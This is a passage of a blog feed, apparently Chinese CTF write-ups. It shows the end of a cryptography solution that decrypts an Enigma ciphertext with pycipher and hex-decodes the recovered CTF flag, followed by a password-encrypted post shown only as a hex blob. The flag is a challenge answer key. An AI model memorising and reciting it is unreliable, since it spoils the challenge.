<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Enigma</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.ascii_uppercase</span><br><span class="line">c=<span class="string">&#x27;roqadboprvyrdhyzwamfqsrhbowqvtjzotrffcjqsnpqhkpwzmfprrugufezxsuwsaohywxbreupifbzkagxjblbhajzixjzrasnzxkaylpazaejwouitcipdfdgprbjnvxuqzqqhtyaxwwikwyybxkdgrcslrkjpgjayaidwajeszppbqatnjojgjrplbkkhotjoqpgvwecjsoabmaupsrfenugybxmrjlochkmjgctznxltnrqxpbephfwymngpoorpjkkbplkwbkxzeqquorpipuvsutyaeqyzgpmqnaiiyssegzshttsrmvcrrkropuxjtqshvypdrwrvnztcstlj&#x27;</span>.upper()</span><br><span class="line">cc=<span class="string">&#x27;NAJ&#x27;</span></span><br><span class="line"></span><br><span class="line">eng=Enigma(settings=(<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;S&#x27;</span>),rotors=(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                ringstellung=(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),steckers=[(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;T&#x27;</span>),(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;V&#x27;</span>),</span><br><span class="line">                (<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;W&#x27;</span>),(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;U&#x27;</span>),(<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>),(<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;X&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">n = eng.decipher(cc)</span><br><span class="line">eng=Enigma(settings=(n[<span class="number">0</span>],n[<span class="number">1</span>],n[<span class="number">2</span>]),rotors=(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                ringstellung=(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),steckers=[(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;T&#x27;</span>),(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;V&#x27;</span>),</span><br><span class="line">                (<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;W&#x27;</span>),(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;U&#x27;</span>),(<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>),(<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;X&#x27;</span>)])</span><br><span class="line">flag=eng.decipher(c)</span><br><span class="line">flag=flag.lower()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">## 475748547berta36623936373230356665373537393566313034383537316366346366623730337dora</span></span><br></pre></td></tr></table></figure>
<p>这里将erta和ora删去后，再hex转字符串就可以拿到flag了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#GWHT&#123;6b967205fe75795f1048571cf4cfb703&#125;</span><br></pre></td></tr></table></figure>
<p>最后，感谢万能的石神，有个小语种室友真好</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>Pell Equation</tag>
        <tag>Enigma</tag>
      </tags>
  </entry>
  <entry>
    <title>vx小程序</title>
    <url>/2023/07/10/2023/vx%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f1c378240ae7a34d8bfae4473907663c1542018a8295f73bba0d5a093d37992d">8947c5b41705548aeeade96021e39d89536fe6c58cc0658efd4d59dce68487d062803cbbf410be3f3dac56be34975fa61fb291eda0345fb436a1ac18b95a9a112abfb42e1963a6f6f7820d154bc3d2416218e711028e740def7af5780d052749197f7981d0c371fb7b7f141da511fc394b8737ddb843acc56a487362888b3bd3c28d99276e8d0b1b97f6e7268e7b623ab36ca30f1912245ff1092ae08374796477b261711d520fd2b1fcbcf55d4d56c98423e31e798404b9605bde0358859cae4c7c2daeb6d8a128f3ebb61970fef3f6bef0bf022a0f3085ce80b5ea9b140ce8507a6326f962ad451b02a3fb85fc5c003a88a1afafddac87562f4eb32e64a80eb21e05e7f5dc5ab10548b0c48606f83b97ce10e9ad3e53ce973fbd53903f3901a912f7dbccd50eef9b311edd09b32600cd206471414890edc49e79a6145957eb3827e98f9d0f92e135535541d6b35ac5353ac06af3d43f117d6af67ff9342d19ddb56c45decc625b0cefa58f570d6ed382e043a77407b35c1099d77efc0ef2a999314433b27cd8833ecdc6011bd35933e6baa2b8c8170ba2fd572dabb37811ccfcb32d9920e40e2125e2387e77deeb090c830642149b12315083dd046e821f69c46c1445cfa0938991231cfafcc0173fc860ab073e039b1600621e57b1bada07f7eccc842f8d541c965837cf10bb82a997b587994b1297ed12e284fc25d2934ada268c5fe53a48b3ba32f5d0500b71f5acab94c2ffb77fbb5806556397bb371710cff883124a0cb55925033a778969a84f75193b9724c62f546c0811362a448faf22b73219c60e0c9eb51d526268a7f31a0a4e656e98dda33c41e825407d7a3b3309de924db04f1edd9b8f14e59d523aedf582cbe4c831db7d33b3f907065cdad2354de90de3891ff50f4225745b13d302fa887027747cd0bb1a508a2e89734facbe5b2d307a1e745d24effa489a64e39a1c9bfe171e50e655aa77745c08842da49531a052688099e9392cf6e883f46f8abb41f1c311979ab3671402ecc88ff3e4a25c033c3461a720de74a82149e83c3712854ecfe5637b88b3d277709e2847244419a6272517dc955c79404c06beb535cba3d7cfcf53d4946a99f0b0adb94bbc68efeb699b08aaaa1db783250a9f3efe791025d492c0e9c79974b992c42a4ea23713f7d27bb9be1463af9f6cb9697d3fa93c7fdd193be870e6933e1c6feb8028ca14a161da19addf17f39d02389a4f461778b8b4fa0a146ef6d30381edb62caa464d26f83b93950b331cd55788c61e02f9824ea886d5d4cce95312c85dc9e13cea8b44f07a82ab8fe70600a321f45b538a4b6b0fc469c4481bbec165ceaf7141728a08848e8b888bca50080a67a1cf02499e145f532ac1945005e05d877ca74b68486d6d2c2686080f1c24b62fca9fdb7ce2d4f584dce60f6fed7d53db02ebb7d4dbd1282bfcb8aa2df7fa22f2e2a6dfd07a8ab25599d2ab97d5f0b47595b14f5474ac89d122ebe3d7b2738227dab8d3a5fc45eaa9e0b561c66732cf7a2412c15a6ee9d00ad8d3e8fb9f63c11de38bbecb00cd2707ceb71d7c176618dcbacfd74ddd2f0bd7aa1090f593e5c6e591ad7414b30ab86522228cfca64aa1a9a370f9a6537efde0748db62b8a0014799e29905c1b70f6056210e5f53ecc391d5ff768c9ac658b315d2f7d5f1f3256c48b483482bff349cf1d5d0740f2b25284f3143438066375c41ce873dd0c8367f63a928b7d9894f28dbe3fa0c85366cf1f20eee219223806e2c23cbdd8c19d275a9f572a5b1902b62668b9f63f213c3602e9552a4191bf4a1042d9f750999bf0372c2d76f7f49e21729f2fab486551b36fa284d5ff61832d9b22785ccbe065879b7ac0c3e2b0131d3b8f0abd0f8936c2c654bd5818a0041799dfe322d3c1b591b886dbe0047e0710e75db21acfd3a76ff3bfeeb8826f0c83078948bab7e129dfd3ed82436de82a0ef37b55cef1b1a881476ec31f3547720ee27e122c97e48e792161f0e79a73d4c759df05932a5ed6c2edf4585e105b684a605dca600f23560f68afad1f3271db2732c4622de5aa7b534ecbc0d870e656c5c8ff1a229e3aa9469741a7349645a7e8c3598a2ab15e82523e80f032f14dbb412be9ddee069caf5139cbc127b49f6f9791ae0d550031ef0b73707b1c68e50357908543490ed8c9f50389070d6205d121f6af3ccf8b05b555e1795abcb06ef5548d912acd03a0d46dad911ae12fd546283db007583405b635085ba69eb934c1fd5c90e2b16e2b120c616ab791291935e4751090a027a9204eb8f15a9a4c38a86676f780ed9ce4534fac35c8838029093c5def1178fdb3ddd49fd2a25b51fe44e2914ade7a411432336ebacd038cd33dca0061c4e1a02755b61a46f8231f080c3c904bc00bb379b87dd3d7fa992cc809eb961e09de7e49f4f6d95231a1c4966405dc7872849e87a81e310d8ec94615ba12b469822c1976838ebb2a689b16ddefbf2444988aa16ff24261e361f945ca7ab486950b7b789d322a9569ec2934257665227d274eb8533391392ae509404ef7d1ee5dd124c7b9a1c99659db737462bd87b0ea86cfb8dd9a11d858e7d07324a5685bd3ebafbd0f40f8a94f16b7659a144fae929e284a52416150252e8d26e00bd924847060e1de4dd29f72a592201b6b16cf924b0fa83c0ae14d105aedc4c59c1772996afc48813b96dc19ac01b4bdffb1811b0bde1fd3dbd1d8abd0149f96e9899ff7c149b0aadaaa3a1a447436ad88d4896d9fe3b35bae082f38fc22650a686d8a306cae207a97764ce4bb7e72253034e68c67d03972d2e727f9278dbf5c27e6b29a795c887fc71926c87f70592b1f7438bdb49b4663e12fc4cc78ef3e89e9e6e63808dc138c48e058ad6721a6e570ceed87b3372283257c50b513b88ccc2e3598d05911d4073c8f4a1abac9db38864729695949804e148b8b36ce4b33b43e50b7860876b8280b8122d51e97a31acd5eded11e2c047401c1a312be94e6b4b14c0ba8b693c2f27705f5825bddbebd9d098b7e7d95ef9d9ae561710865318fe3d9f4b7a8e0a013cb0ca9790ad198295d2c2c5d9881fa33a052365b4106b7b35a736d100fd055ade61e8394daffc3c1ba906de13624b757008c9587ac4f102f6f85ad7c81e2dfa30b2fcbf52d9fea889f8c02b2e84c66a60d710b7d6b831886242af5277870a815015815a22c9cd4e0729db6723aa63b68bcfc30732d980021f8cca03c8390436ce6b27f1736e2ea9036ac58f1018ebebe9d1bf6adfa896f7e2427a40c5ab1e0fe3282ed77fceb8c3651d2ca9d15d98f1ff656b4d8f38c1d0c8de94f506cd15ccac3808c04949816d35d499948a380d179ea0d8f27c31efa76f2b2fd0c406dddfb802d8f8661bc71cf373241fc9b82b9e93326a421e596e03944aa787cc083902c028a4cc6668bb433cdc296cd9fef31c31cf0bf244c8d652990020623a5f2f259ec14a5b89d6b432bf36034018fcf0b7679afb6c7b7896f450c76da02530ea7ca2e4f50946eda8167277cdd5fff89957b96030f5356761aea40d5bd9609ca2137b6386b84e531cc58072deecc6bb47a5aa7692a12553029facf4af50a3aea70fa0f9257453d954a2831ffe88ac8f26071790ae01bc083892bba851a32cea1cbf7a9160c948e5c738283fbfa0b22ccf82296db71a4b5b9c0fca34d6363f2690101c48276d98d31937bc9b56227f34bbde1257f513127302ee3f3aa8ef849ca7b7bfc85ee71f25c33643cb937fb30fbcc1a9979db7f29d1cac8c156e71ac02cea8e381d731713258d039bd4a751962b36af4463a6c3a7e561d850309a184160a37e952d22d9880a1df0d077ae3e2e0aec596fd7255aee05470160d79245fc64253ca5b8adff5e171b99e21792f7aad4c66648c8a40d0d3d6c7716a1f60df796e8657a8a87e52dbd82de1fd7dc00dfd455623a20e0d6f3d3ea092becaab3828b0469df57e98c8d979e9f2060ed6ba19b4fce0e5e6e274c5a8917b20394ab8f71b3bba16454486ace274e0af70a9a2db4106c7886f505978e51ca8e5adcb79fdede4f35bea7e420e707de265d60cc8f781ef1eedc2dcc3ecc29ef42f279e0aab1b3596fb0e85b53f28c4ed1f7f10c94b01fc943fb0e689a15a2ba3c11a51cb17694f64a012ba7feea85bd4f1fea9666cad773289e73511c7dd94096d21f552d1c074c9e6a65ed5fa4e43336a4ccd84c9290161322ef767ba9f7580e17673d70f5b7ca2f32e98e43395e5692e390794a1d616fc8036061bec621d14d66198ed9d64d2c6fd8ab933f9f7761a08198378c1eaaeebdaed9cda09336c8ae2151246feb50ade5581fa27c979a90a7e43303fc6c59105542f33b12dc9be353000d6b4ef95a346a1f25a4a2031557f9e86156ce91084c4e5ff270aabfbacbee02fad77ff4e888fe5523ee9e5626664c8882af9d5f862f8f5d679728c707833cefd44c93fb752f0e03efc85bb48185363164e5afb33c4c77860ba6df3642b5b30261c27343f0b0ca036afb53753cec5b91eacf87509d681395608fefec224cf6fba4c9b7de18c7531ca42dc993150f8b6c79ee4d6e71032da200820bd3c0a4591a27ead9cfff1a1eebe6b025cfe236861c87657beb303c8a9484236818192416e9664bd8ed426e819b5f36b78724042e512e81d325d5dd1b9640f31db5bd26b6f4f53c42f45c4da210ebe644fafd712e568f517de2adc9852db7ed032f805788ff093c8060aa4b4c34f24f46aca313d132eb43285fb920695e328e3599f4d018134297de222f44d51aeb5cbf5076c989d1aaba1778c9c65c4a56c085d17684931525fa20d799d3364bc582e0733a48095cb31c2813dc0de567cd325d4f778765b0b333b7f805c319e1db83abddbc2f2a223f886468c542e4bf42c3c1ea11b7b958679232889e60043985439076abc505192e4b385b55eaf368580adef120a7f2f0e123ef65bb6272ed440e16e3230891b74810775edee084be6d399f40edecf1b8f2876afc05fab072d71877b0a6d07638f51d25717a317f87fa50e09642c2e2c5a8e53b353c65c422ae0067630c5de45f1a8553068a43c69344334558678d3d9034d71ce68393bf45ef0cc3745f5651b4379ef3b16e9372b1dc84be6dbc8798e825e465a7dd2b4a816555e5a5c0139dcca826ed4a4f30b55d58456dc402f95f8496bcb0ec827fa9b4fbb37d3582166e5360add429bfe0ac9f86b1403b4a5856dfc1dcc1405f72bd534498401b3cd8c09552f8ae4857aa16ff8e79607e146e9db0ad467bbb957ea4062745dea8d862bb0c7fe4e84ae9a6c1ad5b4f38d99e62ec2bdeff20cfaaa41fefabae887a48874b015d798f84091c8535831eb8aa6d7cf533c2764480fde62b1911200d4ba8de28140461cf9023b5cedce34c13f24c8def5ab4a241a46d72d12bd7ba9e69ee50b867387e9c7eb808cb7b39e3895d8344d24dddb487b01aaa0af730460e83120dfd46032f297efe988396a85204317b65c8715e0c28edc6da07b8e7f4877f3affaf4b65b05a60ffd781eab98e78f32147afb5770cf2cf705de8e6f47fa8ec55f6fa1c7da1cb1a468eacc9d9c58d12c67d85580aaf45390cd7c58534cde1deed134149e00b9183c888c3b96737076793a48066b61de1a7a3741a2aef6d680726bc90439373018f749c1035fd15103618b8e066cf9139bc8eae8c24dd95b71b512aa4374c4e7aa3e4591c0ba2171d6f35333e01aa48554dd0b40bbe581f205ce423feb717163fe205ac97f6bd7f731acee3a761659fb39d176d667fa8196b5e11a3ad775ecb1242440af7d1f1943f556cfbf7b1ed73ef2cc6a54a02fe6806500333beb3c539dc0b82185f263c0c596e2ade4c05753cbd18990b823f6d2fce4203cfe2bbf86066d61b18c97fc7a61192d20b50ee1a415a30aa78c37a56e259f6663bcf893e6cd10c569c8b56c1408cf8ec5590697e99460ac2c040babbff7ced2e1ba85282d4937fe64b8ecf1c752f3275b87e3dace5e01e5a5489366e3b04228eaf5050d750afca1a6ad7aa7a94b59d50e8ab2f1e46fe1f3a2076db65bb63279dc2154a81c88d2330bdfb5eb9c093a5bac482f3b145c20dfe775c0732e886b709a727a2491927bb194fd49e41c043d2c50280c36c4d9a946cf5f9a4f3a54d49d7d330fc3ec5c281a6de6e8361cc33feb1fb6cde23ff3880dfd2fe951801c889371c5a85d3d75a0e3c109a74810639effe6a2c49b308a3b15539916f2be5b7953fabd94e679495ec372d5ca2105481733a6a207a6b30e59172763eab17996909e1520bfb739d21c40f1abc0a24d589dcc03d41934a2d0db6c0d5790c9aa4908e560d197705998b07e424e91321eba779e8771ca7590ef28a1fcafc1f5ace8ad9a7fb12f4ae3cd3d397520797531cd6e938dd205a8ed64707edba04cf7014f0759d701f4b639ec178e270e43c36463a3e48f11bb87bb1103da7e5c1dbd9307db60b069e7e2f7621379df94104bd3ffa8dab0e87c662cb8e68e9391bee4b5155b60bbebd147328d78490c3b92057e1096d60d6f18ff2ca469ed7138523d0db11a1572312c11bbf0a4cd6a22766585c229a6a35f27306b89c10fb46e67cddc90f95e3da4531ea5484f2a2f1213279f324c02eaad56f884bad505b7ae8b19537c9790b095c22d78b8262d7a11f9c6bec38f0334559ef5aa37fbbf97b894d2a28e6f4636fd2776fad1bb1922c76dbe1123cf16a27522a3e4c890e5c3ee66db098a2bdcf00862c978788a20c7378be9bee399d5fbccd5f3b7f3f0b65f0fcdb2f0529f54087985f71547ae5a61684c377c3a334a1cedeba1ac1bd12286e5f0cf44fe48118664daee72e4bb94f15a273b77f351cb5d9f261ebade6cc7926f5ea63beaff3042f2780f1c04aaedd62112549fd99477e02adaa5adbf65fc022cf26c53a6c2ba36dd50bcee8487f946952346328c249a8c0863a5658c65054f792e2e4242ddbb202ed9f21df98cf615053b521071801788a181ea1b1a77f39fb1d14eda74d57a27ba91b55e92ae6516b66b4fb05d4cb74a4b0ad77545ebf5980dc8a4c8f8500eca6891667ecffd42a92f5b0e5997bcf9e4686dfc9f9cbd14a6eff91c9913f0c117da24be003d230350462fdf11c71680ba53f75cb4af2470a9bf48e26ab837007292c21130b5a724fedc859ddd36d3cff09b9938ccae9c9be0ca5ef5a0e4cd1abf28f6c3bdea784fe5a0f8a691a91039268babb7fb4aaff536cfebac3308b5a4b0f509ac23454b225295a1d812a21c0fae325619197877850ebf5c6d40ab0dfa3af4c0c1c6af381df6bc04cfdc5c01009fc5a3dd0de162f9726df9fcf5f656e4816f0326dc74e03176df68d768770e0acc378a4f406cb23bd79fa67b1773409aff3c466745ac0a208e4d49c0580b0e013d515bf8dc76ca457c70a952936b2d3f98e6f8238976721aeb255932d03c14050066e7eb6efd5b440f0c05e052641d9ad15ceb83496c603ed955f20116c0bfce953575cd36530d59edeb58911ed4279d06c9469b96bb9a487f4624e5e30da39673a2c9e017c21199eea9d93425aaf3ea00e16f02d6a16584f5e46efe4e08df2078f0a77684826ce9ac80486ca94551cf0d72203204024b96e6b5904d48e67a8d54e9910fc1d5276b1d3554b4b914e9af7d6078eff9ebdf0867561ca4be8709b23088a082c6a009508f2fc64dcd6f2fc5ff87e03a628962dd1e2be2b597a156b3d4be979d2ad3262f7f2a9aa2cd777ee25e93e363a58a400bdb95ef08472cb829aab7083830d21c3a400757c2700857d99cfbddb5ee824899b40bb899897ba92c9bad16d85df2e76198e574b70907a7cfb055c7a618c9ab3ea208dafdcc2901567fa8486598c2e4c637cf5768ed7e5ae1f77ceea420eb3c97ca02b011ed4d71a705359e43b525dc12a54e5633bfa6cf94539bdd9a29ac6afb56eab4f939144c5c4b88b7ea9ae4d229e20878eed64855c5c162aa25af965333b4e58cdb3fba68f99c5a522b2210032f38e5db627b11a1dd0ed84f880288d1f9c8f982e84df438f6eccaf7f97533be849e7c52b7b4e35ad88ead68f2d5b1878a266b0ce00d84a3379f3544d7a0d04a9e52ce3a17babb8421160cceb3696e47d5c4ea492bf3a5374cd28d74184cae7a2a8138fba08be9ed0c8f07a5dcdada2b6fe15b2b566e50e8f518e23c5c62f6da097708f8566ff7b27d035b942dbf1d46d46a95dd07e92c73a5806324e55275c000aae4e3317ee76983e1ffa98247a9a8b1ca76609729144a5c9f84972a22d104ad469551ac2479f9a7f3043df0977b72af6a37ffd672fa4534b8b73270a6544d7b0794f71f61833731170dd4134d30bcbddcec15297b63dd6f07c0fce58e26b0e52fb754f85bb5e7bf96f5346b928017c9064749055264208a61c73228616a70101d71af4e39521b661b9a9e191b70163ff2383aa6eff0f9d396ecc1aab92f2f0a1b9b9788d40edf5b372911e06659b5d31d6bf8424dbec71b186e7001359f4542a57874ca1224a1ffcb0f34fb3bdca344a1b01c434f423efb5f0913ea0f4fa9ef48c81e30cfa99e7dd6277b7e98a4e0933872dd49343e68fda7b63c8c27643efc11badab370f573d7584f8692c3589e588ba1586a1f08cae0e2977124fff621aa41232c2a0debed25626b0c2fd037e524a599b13c985365065a139bd4ff7ec995aa21f752cd326b1e76851c5358a652b2150312f3d7b6ca58873101e06fc0f623d01604ff27e86ce3b2d771b2d92f2dfdce5ba1f34f59be7df4d264e4e89a3a69faf01ddb8e2557a57aca64d8a66ce9a5497399aa4182511133375d125f13d8107136fc60668cc692f90fb92ac194f654a61cdb873ff6e019eb23ddcd6a45aedc25bb0dd9556c245aa1b2eec6958894ae0842c76144b93afe9e2718676f1bc2d3960281c74a4eb677751aaa81604cb5d4dd25a1cee7436c43ea74fee849e77d072a3a5d6b5ab97bf0624878dfbeb3fa597344f0a8ca9ee59da5b1f5c99ced88de26c8d35b87e971e6bde2b7ee888649be8dfd210afe4b2f1a61e8e0ebd095ca3f5b1b5aba66b4f88c9869e26e2da3fa5937ea798881f3d92b223075a20cadae92e36944473b736c4e5f4032126369dfe4c08e162dd4042cf4fff0f0fb947c7595e5e720cb9cc9705c788bf5a304ca08c66d04ffdeeecbada21d442b59a2e8c4b8a6cfe7d97993ce0983d70a351756c8da0eb5d906d3f19796fe44b66199dd862f48ce7ebc74b39e356bf2b6416c69828bf2f7659c8baf880d787bf06f482155c7688de9632def08d0145f2b5f6a47a403a89f38f4e9e1b56b21d8d9ab0d307045b41467b0497c8fe570a42a4520c54747809fed2efb8cb8066453877389ef960e2a97ac33cbfae1a7fa8ee00429c5cea3442571261fab93c7f146cb0b19214916d11921a02d9f7eb4a1e15a2137819e0a20b66f10ffc97e31484c68ee957ba8d7c8a8da76adc3054af30e2aa37759d235741377d986c6f2c4ec114ba40568bc575d84e9c034b08bf232bb7d39170b6e0112096ab4e6a9e8460b766cc5969106de2b5fe036d4a86a96959f23ba031a3080ac5719813d79578d2d5ba1676adc0794af60e64baec0815b702f1ba1b6909204a81489d39c664555d287277c67a4b54f45c77e2a87e856054c067d18fc8b5ae5a6afaf9ec6f36e0d709f40a21445c216aeb769e1b6ca19457a24d3da206116cc81170d2fe1aedf0a70bc8457d1d5900f136fc2f3be228a1cb9d39b44117aa5af45b4ba3ff2ef27bae5516cb78a059e19238af39de2036ebfdb4ae34ce5c8c3e076991abdc2c0f27ff3393a2ab5dfa8a9c97159cc95f0a4e00c78329351fa8c1d50dc78f0989fbeed986b83b8d29424a8bdd34edcc2ec7f577e8c3e3af6d75b4f96aade7f0dca3d7283bf31b966dd84b4934789916af79e7817a38db2a8a764f871efac30101091a78255a526b184d168c4a89dc9cafce04de937fe6f21bd45d14066cfd5f7bdf608ec00a2184227aa38dafeef93221e8b2df34fedb94bfc83c362204480b45df73aa7a772fac8110907d44c9a46d13630e39e3f6389e2b100cf496e964144ca577c86127409bd899c330012e4723bc9b9aabdf1b1f88b6e7516ade7ed15edccb89057cfa287fc79d6d96cb6d56aeb4013a40a000750579374ce867e35b4071cde983075bb463e383af98362e9a34056e5bdb60cd9d19c558115c12851b0b3a36fc45ec37f8257f7dca19ab6943ffdab5c4edad87fa10fb5d680afe79d7c2edc78460b964bc48f8bc91304850fee4f00a3a9c4383c269f9c2bf9d86d812289cdeacf99d6dd65a288b884e562f6f4805e9f1f17620d53f1edcc3b7e152e300db2e9a5cc15f650b9d239a505d35afa7fe4e6d858439a59df7cf01ba2706d624a7b9dfd5114a9cac87f81d4c458f35028d405fc00261cbbe6a454a149f447ad080ee86544e795f2e7455a03bfda89d415570e36860a736b4b4347334f1d72f318f90cee8e77251c663748dff7e8eaa62ab5f9e8b1eff06ae87af46b35d3481e29a3265663e1cd81cbd4fbc6bfd88634ff38a570bcea0b6b8bb38a30c412e5f6c9a958360b169b53ae76e1f163364ea9263011f68c98578447e47c4dd2dba7ee447e1a628d4f05a433daa7e0b6a29f01060e68eeef196f87273e4955a7d902b074d510c564da974bfca89ca291cdeb5b94a512d6e806b0ac3779e0e66df62b158722fb3afb6aaa82214607f74e782d14aae1d8c0e2680915e36c98215b5e2974cd9d346232cb229b2962441947747011f77ff846808eb831af0d7adebd4ad2f31c9d6a719a8c3a100d0c28692537c7a142ad9730d285e6759923f49152e37baa113c1125358347c5e1d21f7a5bdca84b1fb4f2377d912bcded4ed4412808db758005be6274bf08a3e87e875e98f30b5e1a8989e8497e6f96232e5fadcf581c867bfb3559fd9c513ff8f14c138246e31592573f8519b1728b6bed7885cfd528cec306f3d22f3ebcef9e9d85687bffd1671834e4cf85ec92397723cbbb32a09da90cd8ae0e79fe03fb818da676ceac38770e8aadb79c4fa30823f95647a1ce8bdc98b432c82dba29470a78267971050e284fb268ca3987d9fe2805457fc88cd784660f5e30d4d79dc31759c8e9a2d4dbcbdf6b8c8bc8a5f97b5d9483a613393c9c99148f5c99361cbe4a822d259694f098e885d35f66ba118f829de321e488ede1b9295633a16c67ce52b532be5d6376ad344bf3054034fc62767290627b24a663dc8b0a44f7efad0a9a70b9e81ca494bcbdf1fe6be23d8e2fcdbbf25010b3e6db392d5a109c39a95b6ee5feeceb12d145ce052aa8e813b6dfaec61bddf766655cc7d36f2fa3038091ae74afc03b3fc69de94c3ce974ba87a051b7da44b6cd56e0b63b61573aea3d9d140abc4d4997e2e050c4a8f57654bce7f5e67c55ee9fda2c3e1f8ee754d3720fa8a5ee38b78d47c2f2cca1a7ca59f807489508af55ec96e3ef01e43907080651c8cc377c801792227644ef087419073e016d9ebe12122f14a1c00415c4d609634e65ebdfac450f64fbe0e45a3a87d8db3c177b50d78e4637cafc0de4a0a27911727c089a075fee21be959cfab707569d37bfdd11a9353613d324150665fc015f8eb791590bd4b3848f9f849435f25a4d74810216effec377eab351f92a599d726419fa75635ddc923d6581504914d71f37735b20f3db06b69d9546157791e962ce6e120f749c1bce5b4e7e91d79be84b5db1211c75a11da7e112d447a5655141cb09d1882a7ddd3deef076c068ec3e54cc54ae189543252f86ebe28183607dcfd6dbcfe0ccaaae7befe4e3abedc6e338e765f4ede6f215528158ffd7ea2922e5793fc8c018ea09d886b8d89d674c55aee57bc9bad889bc9c55d165c1d4595b66fb9cc1a0dfc78c310223ca31b0331334c77de4545a1da6d67a6730ed69e5040f3fac5e25731680f862e986094843034a3a1cac17eaa0832cf331face00eff2b1f574653cfd3453c6e1a7faf121675e114b516e974b868a73a9d00414f23065401bcfb7ac89a6472c9ccb358f32e70661e4564c86f685c2ecb8165e5abfd9753be7257b10b28ac69a79d94fb3591c2d3ae93d31ba3af2d981c39310858b7a1ae68e43ed28a6584b2b1f08fa08e55f07469bfd475f06d9a01a0b366096b3de9b70c721a83fe6c3a3f62ee5028092193e1bf545c756c5fa129919405152707fe9f639847041deb0c8ecb388019aa30b7d1ad43dc333ca181d7822495d38158be33eaac81605587316deb0d729ee2c2d2f42a023fe0c911a1308c07efe0ca1558b6a26d254cd05263f4cfbea8736d981be24fbe6ffa862af13347bf6f464f77e9222a5e644a8d72c1f41e4db46d25fb525e93fa33fa9f9823ac8ff2f5e357dc39d248dce4ac5be734adbd7ac1167c2a68b33860881cfcaa5ee05462f76d166f9d7e5cc18c47817ec3ce95ab6f4414048647c72241ea3420e0d44909cb9d6aa48a77d0ddf8964c0f7414166bf41be4982a6ca65cc3ba3aa441fa8e1e8199c7e2dbb96e043c69bf73ab450be980ffba059313cd33403491111637314b0e63fc816443966885540643fdd1f26349c0200ae3c9cb6b8f2ca516a322748ad42672f3d7feb15750f1ee915ddb882b68b6d3d9dbaae39bc5682402543b9168f0058ff73ba8a2237fd036ddd344a1a405052d95793e2189119a59852377dc0d9cd917eb33570ad3a349f2f0988f4458055704cad438b8c3631707d071540fbd7e611ecad77463b8565bcd4c467cc3d05e4316c2823752abdccc02230f02a5852932e426ab7f987bdb40cd5f296ed48e1e7a26aec50800ed427f32283d2c200380c9627c993a597e3287e343584a56001570293422676228667a1fb602b8ae3bc1f75ddf769959adbe0c44f48fc7dd5617b715a02cf6e7d69a9d6db5199f4fde3100d448a9c81a20282c8b1ba8f2463da6d6d9e65dbbd3a130356ef7fde8670b443f480196028c848815aeecd8068df9c26dd2dd7effbfb5ef3a5792f07edb3d3a154682904e06674aca3524915f86e75dbfa28cfd8ddcdb3563b43670f79b5f6a271f372068b20bd616679a1570e0c671959e184e8f979242c002919be9fb5f11e34a83d22ae1187521f3284bcafb2a446174b177ba7a5eb951a627044cebf5765d1cf012aea48173d5981b3cf7361dc6d09ac5645d7f898ab30f1b2d3f8de3e1328924a3b583b9eaf2bf358d863b6afa3e767904efef5227c64e397ba7eed3308379608016074d0f4fd835179e12e826c43c847027e9d1f9687faccd5f2d3e87011ac1c4ab4bc272f230dfe300935f209b7880954b79d0085d87e136b975c9afbf831bfcf61da9b73ce2c3ad51c80faf40a5f0d8f5c9802d694c173e290bf67238165ae6bd243a5f7b29b1ba75b061c218df3de45dd7327036a4f0b7ee2b64440ca4d8f21b40b33e7cc7b2134c1854e64a0417866a3531eeb32853722baa7aad309afac32b4704b508ab60ff5b5c9301219f6293b5b6a805889ac6b42e3f675b968352ca3e0e5c48865e89db47db623adee9e2f196ef3c7424d735c06a1eef3bb0f2c48406ba3d10f0b75f830d0b68649e697cd5adb26e584082ba0492a031d9d2a5f799dba8667dcc232e91fe340ffbb20b7c6dabdf063004abfa64494c4b381f55653f54f2d83c7be2f9bb149db9afb98f30ec3bf08943bfbeeebe1662519199ce98cc513d4d